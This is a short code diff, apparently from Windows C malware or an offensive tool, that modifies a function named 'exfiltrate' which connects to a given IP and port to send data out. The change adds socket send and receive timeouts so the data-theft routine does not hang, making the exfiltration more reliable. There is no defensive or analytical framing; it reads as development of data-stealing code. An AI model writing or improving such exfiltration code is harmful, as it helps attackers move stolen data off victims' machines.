@@ -36,6 +36,12 @@ static BOOL exfiltrate(const char *ip, WORD port, const char *data, DWORD len) {
     while (retries-- > 0) {
         sock = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
         if (sock == INVALID_SOCKET) break;
+
+        // Set socket timeouts (10s) to prevent indefinite blocking
+        DWORD timeout_ms = 10000;
+        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout_ms, sizeof(timeout_ms));
+        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout_ms, sizeof(timeout_ms));
+
         if (connect(sock, result->ai_addr, (int)result->ai_addrlen) == 0)
             break;
         closesocket(sock);
